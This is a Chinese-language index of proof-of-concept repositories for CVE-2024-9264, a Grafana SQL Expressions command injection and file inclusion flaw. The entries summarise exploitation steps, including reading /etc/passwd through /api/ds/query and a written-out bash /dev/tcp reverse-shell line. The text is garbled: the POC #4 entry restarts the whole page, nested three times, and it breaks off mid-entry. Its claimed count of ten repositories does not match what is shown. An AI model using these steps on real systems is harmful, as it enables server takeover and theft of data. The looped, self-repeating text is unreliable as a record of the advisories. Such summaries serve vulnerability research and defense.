# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

